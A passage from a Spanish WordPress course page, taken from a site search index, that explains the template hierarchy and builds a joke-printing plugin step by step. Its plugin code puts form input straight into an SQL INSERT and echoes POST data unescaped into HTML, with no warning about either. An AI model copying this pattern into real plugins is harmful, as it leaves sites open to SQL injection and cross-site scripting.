los artículos de una categoría (if (is_category()) y mostrará el nombre de esa categoría antes del listado. ¿Y ahora qué? . Ya tienes una plantilla sencilla y funcional creada desde cero. La creación de plantillas no termina aquí, claro. Solo hemos sentado las bases, pero son unas bases sólidas. La API de Wordpress es muy amplia, a menudo confusa y casi siempre redundante. Especializarse en el desarrollo para Wordpress es una tarea de largo recorrido que no puede aprenderse en unas cuantas horas. Pero si has llegado hasta aquí, ya has hecho, probablemente, lo más difícil. La mayoría de las plantillas tienen más archivos que la nuestra. Por ejemplo: . | page.php, para mostrar páginas estáticas. | author.php, para mostrar la página de “acerca de”. | 404.php, para crear nuestra propia página de error “not found”. | . Por último, aquí tienes un diagrama de las relaciones que existen entre los archivos típicos de una plantilla Wordpress. Recuerda que el único obligatorio (además de styles.css) es index.php, y que una plantilla compleja puede tener otros archivos adicionales a los que aquí se muestran. Fuente: Wikimedia Commons . Cuando Wordpress busque alguno de estos archivos y no le encuentre, recurrirá al siguiente en la jerarquía, y si no existe, al siguiente, y así hasta llegar a index.php, que sí debe existir. Eso es lo que nos ocurría en el Paso 12, cuando creábamos la plantilla para categorías dentro de îndex.php y no en category.php. 1.2.5. Plugins de Wordpress . Los plugins de Wordpress, como cualquier plugin, son añadidos que incrementan las funcionalidades del sistema base. La arquitectura flexible de Wordpress permite realizar esa ampliación en casi cualquier sentido y es una de las razones del éxito de este CMS: con los plugins adecuados, un CMS originalmente pensado para hacer blogging puede convertirse casi en cualquier cosa. Los plugins, como ya hemos visto, se gestionan desde el menú “Plugins” del dashboard. Al instalar y activar un plugin, lo más habitual es que aparezca una nueva entrada de menú en algún sitio del dashboard. Cada plugin es virtualmente un programa nuevo acoplado a Wordpress, por lo que debes remitirte a la documentación de ese plugin para saber cómo utilizarlo. Hay muchos plugins gratuitos, otros muchos de pago y una gran mayoría que tienen una versión limitada gratuita y otra de pago con funciones adicionales. El desarrollo de plugins para Wordpress es una industria que proporciona muchos puestos de trabajo a programadores/as en la actualidad. Como hicimos con los themes, vamos a ilustrar con un ejemplo el proceso de creación de plugins. Haremos algo muy sencillo pero bien construido, de manera que pueda servirte para desarrollos posteriores más realistas. El plugin se llamará “Chiste” y se encargará de imprimir un chiste aleatorio cada vez que lo llamemos desde nuestra plantilla. El chiste aleatorio se extraerá de una tabla con chistes que almacenaremos en la base de datos. Lo puedes usar para imprimir un chiste en tu web de cuando en cuando, o para mostrar un chiste diferente cada vez que se carga la página, o yo qué sé para qué. Construiremos el plugin paso a paso, desde una versión muy simple que siempre contará el mismo chiste hasta la versión definitiva. De este modo, comprenderás muy bien el funcionamiento del sistema de plugins de Wordpress. Crear un plugin nuevo . Para crear el plugin “Chiste” basta con crear un archivo llamado chiste.php en una carpeta llamada también chiste y ubicada a su vez en wp-content/plugins/ . Dentro del archivo chiste.php, escribiremos el comentario de cabecera para que Wordpress lo reconozca como un plugin válido (igual que sucede con las plantillas). Es muy importante respetar la sintaxis. &lt;?php /* Plugin Name: nombre del plugin Plugin URI: uri oficial del desarrollador/a del plugin Description: qué hace el plugin Version: numero de versión Author: Nombre del programador/a Author URI: uri del programador/a */ /* Todo esto aparecerá en el panel de administración de plugins del dashboard */ ?&gt; . Añadir funciones al plugin . Vamos a crear nuestra primera función dentro del plugin. Abre el archivo chiste.php y añade esto: . function chiste(){ echo \"Van dos por tres calles y se cae el de enmedio\"; } . Supongo que este código no requiere demasiada explicación, ¿no? Pues ahí lo dejamos. Instalar y desinstalar el plugin . Para poder instalar y desinstalar un plugin desde el panel de administracion de Wordpress, es necesario crear dos funciones más en chiste.php: una para instalar y otra para desinstalar. Estas funciones, por ahora, las dejaremos vacías. Además, al final del archivo chiste.php hay que usar la funcion del API de Wordpress add_action() para indicar las funciones que activan y desactivan el plugin. Es más fácil hacerlo que explicarlo. Ahí va: . function chiste_instala(){ // Por ahora, la dejamos vacía } function chiste_desinstala(){ // Por ahora, la dejamos vacía } add_action('activate_chiste/chiste.php','chiste_instala'); add_action('deactivate_chiste/chiste.php', 'chiste_desinstala'); . Cómo usar las funciones del plugin . Ahora ya puedes usar este plugin tan chistoso. Solo debes colocar en alguna sección de tu plantilla la siguiente línea: . &lt;?php chiste(); ?&gt; . Por ejemplo, si colocas esa función en el archivo header.php de tu plantilla, cada vez que se cargue el header (es decir, en todas las páginas), la función chiste() será invocada y, hala, un chiste impreso en tu pantalla. Configurar el plugin desde el panel de administración . Ahora vamos a crear una entrada dentro de los menús del dashboard que nos permita modificar las opciones de este plugin. La entrada de menú la integraremos en el menú “opciones”. Para lograrlo, necesitamos dos funciones más en nuestro archivo chiste.php: . | chiste_panel(): aquí incluiremos el html necesario para la pantalla de configuración de nuestro plugin. Para no mezclar html dentro del código, usaremos la función include() de PHP, de manera que podamos colocar el HTML en otro archivo a parte. | chiste_add_menu(): aquí usaremos la función del API de Wordpress add_options_page(), que sirve para añadir una entrada al menó “Opciones”. | . Además, llamaremos a otra función del API, add_action(), para provocar la invocación de chiste_add_menu() cada vez que Wordpress vaya a crear su menú de administración. &lt;?php function chiste_panel(){ include('template/panel.html'); } function chiste_add_menu(){ if (function_exists('add_options_page')) { //add_menu_page add_options_page('chiste', 'chiste', 'manage_options', basename(__FILE__), 'chiste_panel'); } } if (function_exists('add_action')) { add_action('admin_menu', 'chiste_add_menu'); } ?&gt; . Quizá la línea de add_options_page() requiera alguna explicación adicional, ¿verdad? Lo único que hacemos ahí es añadir una entrada al menú de opciones del dashboard, indicándole en los parámetros: . | El título de la pantalla de administración de nuestro plugin (“chiste”). | El texto de la entrada de menú (también “chiste”). | El permiso necesario del usuario que podrá ver este elemento de menú. Hemos elegido “manage_options”, que es un permiso típico de los administradores del sitio. Otros usuarios de menor nivel no podrán acceder a este menú. Tienes una lista completa de los permisos (o capabilities, en jerga de Wordpress) en https://wordpress.org/support/article/roles-and-capabilities/) | La URI amigable para esta opción de menú. Puede ser cualquier cosa, siempre que no esté ya en uso. Hemos usado el propio nombre del archivo (basename(FILE)) para evitar conflictos con otras opciones de menú. | El nombre de la función que se invocará cuando se haga clic en ese elemento de menú (es decir, chiste_panel()). | . El archivo panel.html será un simple formulario html que mostrará la configuración del plugin. Crearemos algo muy sencillo. Por supuesto, se puede mejorar con un poco de HTML y CSS. Lo guardaremos en template/panel.html: . &lt;form method=\"post\" action=\"\" id=\"chiste\"&gt; &lt;label for=\"chiste_inserta\" accesskey=\"s\"&gt;Inserte su chiste&lt;input type='text' id='chiste_inserta' name='chiste_inserta' value='' /&gt;&lt;/label&gt; &lt;input type='submit' name='' value='enviar' /&gt; &lt;/form&gt; . Por último, modificaremos la función chiste_panel() para poder visualizar nuestros avances: . &lt;?php function chiste_panel(){ include('template/panel.html'); } echo \"&lt;h1&gt;{$_POST['chiste']}&lt;/h1&gt;\"; ?&gt; . Podemos probar que todo funciona escribiendo algo en el formulario (pulsando “Enviar”). Acceder a la BD desde nuestro plugin . También se puede acceder a la base de datos de Wordpress desde un plugin. Esto es práctico para, por ejemplo, crear nuestra propia tabla adicional con la que gestionar el contenido del plugin, que es justo lo que nosotros queremos. Para ello, antes debemos desinstalar el plugin desde el panel de control. Solo así podremos modificar la función de instalación y ejecutarla más adelante de nuevo. Las funciones de Wordpress que manejan la BD se invocan con una variable global $wpdb: . &lt;?php function chiste_instala(){ global $wpdb; // Variable para acceder a la BD $table_name= $wpdb-&gt;prefix . \"chistes\"; $sql = \" CREATE TABLE $table_name( id INTEGER NOT NULL AUTO_INCREMENT , chiste TEXT NOT NULL , PRIMARY KEY ( `id` ) ) ;\"; $wpdb-&gt;query($sql); $sql = \"INSERT INTO $table_name (chiste) VALUES ('Van dos por tres calles y se cae el de enmedio');\"; $wpdb-&gt;query($sql); } function chiste_desinstala(){ global $wpdb; $tabla_nombre = $wpdb-&gt;prefix . \"chistes\"; $sql = \"DROP TABLE $tabla_nombre\"; $wpdb-&gt;query($sql); } ?&gt; . Por supuesto, hay que agregar los datos a la BD desde nuestro panel de configuración del plugin, para lo cual modificaremos la función chiste_panel(): . function chiste_panel(){ include('template/panel.html'); global $wpdb; $table_name = $wpdb-&gt;prefix . \"chistes\"; if(isset($_POST['chiste_inserta'])){ $sql = \"INSERT INTO $table_name (chiste) VALUES ('{$_POST['chiste_inserta']}');\"; $wpdb-&gt;query($sql); } } . ¡Ahora que ya podemos insertar chistes en nuestra BD desde el dashboard de Wordpress! . Solo nos queda poder mostrarlos en nuestra función chiste(). Para esto, extraeremos un chiste de manera aleatoria de nuestra BD modificando la función chiste(): . function chiste(){ global $wpdb; $table_name = $wpdb-&gt;prefix . \"chistes\"; $chiste = $wpdb-&gt;get_var(\"SELECT chiste FROM $table_name ORDER BY RAND() LIMIT 0, 1; \" ); include('template/chiste.html'); } . Ahora modifiquemos nuestro template/chiste.html para que imprima la variable $chiste: . &lt;h1&gt;&lt;?php echo $chiste;?&gt;&lt;/h1&gt; . Para terminar, vamos modificar el html de nuestro panel de opciones para que se adapte al html del administrador de Wordpress y no quede tan feo. Esto es solo una cuestión estética, por supuesto. Pero, ya que hacemos algo, vamos a hacerlo bien: . &lt;div class=\"wrap\"&gt; &lt;form method=\"post\" action=\"\"&gt; &lt;fieldset&gt; &lt;legend&gt;Introduce un nuevo chiste&lt;/legend&gt; &lt;label for = \"chiste\" accesskey = \"c\"&gt;Escriba el chiste&lt;input type = \"textarea\" id = \"chiste_inserta\" name= \"chiste_inserta\" /&gt;&lt;/label&gt; &lt;input type = \"submit\" name=\"\" value=\"Enviar\" /&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/div&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/wordpress.html#12-wordpress",
    "relUrl": "/cms/wordpress.html#12-wordpress"
  },"139": {
    "doc": "1.2 Wordpress",
    "title": "1.2 Wordpress",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/wordpress.html",
    "relUrl": "/cms/wordpress.html"
  }
}
